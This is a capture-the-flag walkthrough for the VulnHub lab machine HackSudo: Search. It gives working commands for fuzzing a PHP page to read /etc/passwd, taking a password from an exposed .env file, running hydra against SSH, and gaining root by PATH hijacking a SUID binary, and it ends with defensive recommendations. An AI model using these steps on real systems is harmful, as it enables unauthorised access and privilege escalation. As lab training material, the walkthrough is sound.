# 🔐Vulnhub-Hacksudo-Search-Walkthrough
🎯 This walkthrough demonstrates a structured approach covering enumeration, exploitation, and privilege escalation.

## 📌 Overview
- **Machine:** HackSudo: Search
- **Platform:** VulnHub
- **Objective:** Gain root access

This machine demonstrates:
- Web enumeration
- Credential harvesting
- SSH compromise
- Linux privilege escalation through PATH hijacking

The walkthrough follows a structured penetration testing methodology from reconnaissance to root compromise.

---

## 🧠 Methodology
```mermaid
flowchart LR
A[Reconnaissance] --> B[Enumeration]
B --> C[Credential Discovery]
C --> D[SSH Access]
D --> E[SUID Enumeration]
E --> F[PATH Hijacking]
F --> G[Root Access]
```

---

## 🌐Network Discovery
First we will use **netdiscover** tool to find the IP address of our target machine.

**COMMAND:** sudo netdiscover -r <IP_RANGE>

**Target IP:** 192.168.0.144

**Why was this done:**
- Discover active host on local network
- Identify the vulnerable VM before enumeration

<img width="840" height="407" alt="image" src="https://github.com/user-attachments/assets/f5c7ceab-c374-4768-b80f-741e88da7354" />

---

## 🔎 Port Scanning
Now we will run nmap scan to find open port and services on our target IP.

**COMMAND:** sudo nmap -T4 -sC -sV -p- <TARGET_IP>

<mg width="777" height="351" alt="image" src="https://github.com/user-attachments/assets/133912a4-37df-49ac-bf17-20c88def3bec" />

| Port | Service | Insight              |
| ---- | ------- | -------------------- |
| 22   | SSH     | Remote login service |
| 80   | HTTP    | Web application      |

---

## 🌍Web Enumeration
Lets access the webpage of our target application.

I found out that it is hacksudo search engine which is of no use.

<img width="855" height="410" alt="image" src="https://github.com/user-attachments/assets/f426bafc-5c60-4989-bf53-5c1d790ea870" />


Now I will run do directory bruteforcing to check if there are any hidden files/directories.

**COMMAND:**   gobuster dir -u http://<TARGET_IP> \-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

**Findings:** search1.php , robots.txt , /.env

**Why was this important:** 

Hidden files and endpoints frequently expose:
- Development functionality
- Credentials
- Sensitive information

---

## 🔎Web Application Analysis
Visiting search1.php revealed:
- Home
- About
- Contact section

After exploring and inspecting page source we can do fuzzing for more information.

**COMMAND:** wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.0.144/search1.php?FUZZ=contact.php --hl 137

**Findings:** me keyword so we will try it with /etc/passwd

<img width="758" height="776" alt="image" src="https://github.com/user-attachments/assets/0bdf4cc6-1c73-4d71-bb2c-3f3fe6870e24" />

<img width="1793" height="618" alt="image" src="https://github.com/user-attachments/assets/b8b7feef-6440-4f3e-abca-63ccba3333aa" />

**Usernames:** 
- monali
- john
- hacksudo
- search

I also found /.env file which contain username and password.

**Password:** MyD4dSuperH3r0!

<img width="665" height="462" alt="image" src="https://github.com/user-attachments/assets/661281ca-1a4c-4a7b-ab23-1bc6b346a981" />

---

## 🔐SSH Credential Attack
Now with help of hydra I will try to login with every username which I got.

**COMMAND:** hydra -l <USERNAME> -p <PASSWORD> ssh:192.168.0.144

**Correct Username:** hacksudo

<img width="1000" height="452" alt="image" src="https://github.com/user-attachments/assets/5443f29a-3929-40b2-8843-285183a95f14" />

---

## 🔓SSH Access
Successfully authenticated with SSH using credentials.

**COMMAND:**ssh hacksudo@<TARGET_IP>

<img width="867" height="496" alt="image" src="https://github.com/user-attachments/assets/7f4a4680-3aea-45c6-837c-80f88de1b581" />

---

## 🧑‍💻Previlige Escalation Enumeration
SUID Enumeration

**COMMAND:** find / -perm -u=s -type f 2>/dev/null

**Findings:** /home/hacksudo/search/tools/searchinstall

**Why this mattered:**

SUID binaries execute with elevated privileges and are commonly abused for privilege escalation.

<img width="603" height="366" alt="image" src="https://github.com/user-attachments/assets/610373de-5c65-4217-bea0-755bc3892b12" />

---

## 🔬Binary Analysis
Examined associated source code:

**COMMAND:** cat searchinstall.c

**Observation:** Binary executed without specifying with full path.

**Vulnerability:**
This creates a PATH Hijacking opportunity.
If attackers control the PATH variable, they can execute malicious binaries with elevated privileges.

<img width="762" height="206" alt="image" src="https://github.com/user-attachments/assets/44b9207b-1b70-4610-b369-a9a62cbe887b" />


---

## 💣PATH Hijacking
**Create malicious binary**

**COMMAND:**
- cp /bin/bash install
- chmod 777 install
- ls -la
- echo $PATH
- export PATH=/home/hacksudo:$PATH
- echo $PATH

And then execute ./searchinstall file.

<img width="797" height="448" alt="image" src="https://github.com/user-attachments/assets/27753473-cdfe-477d-a972-6a8c9a524ae2" />

<img width="1046" height="101" alt="image" src="https://github.com/user-attachments/assets/ad24998b-3e90-4c14-8578-7d64dbd59805" />

Root Shell obtained successfully.

---

## 👑Root Access
Verified Previliges

**COMMAND:** id

**OUTPUT:** uid=0(root) gid=0(root)

**Retrieved Root Flag:** cd /root >  cat root.txt

Root compromise successfully.

<img width="1010" height="276" alt="image" src="https://github.com/user-attachments/assets/4e0b8b5e-46c7-47bd-be48-bbc0de32fb95" />

---

## ⚔️ MITRE ATT&CK Mapping
| Phase                | Technique                         |
| -------------------- | --------------------------------- |
| Reconnaissance       | Active Scanning                   |
| Discovery            | File and Directory Discovery      |
| Credential Access    | Brute Force                       |
| Initial Access       | Valid Accounts                    |
| Execution            | Command and Scripting Interpreter |
| Privilege Escalation | Hijack Execution Flow             |

---

## 🧠 Key Learnings
-  Web enumeration often reveals hidden sensitive files
-  Weak credentials remain a major attack vector
-  SUID binaries should always be analyzed carefully
-  PATH hijacking can lead to complete system compromise

---

## 🛡️ Security Recommendations
- Remove sensitive files from public directories
- Enforce strong password policies
- Use absolute paths in privileged binaries
- Audit SUID binaries regularly

---

## 🛠️ Tools Used
- Netdiscover
- Nmap
- Gobuster
- Hydra
- OpenSSH

---

## 👨‍💻 Author
**Jeet Bandhara** 
- https://github.com/Jeet-Bandhara?utm_source=chatgpt.com
- https://medium.com/@bndjeet11

---
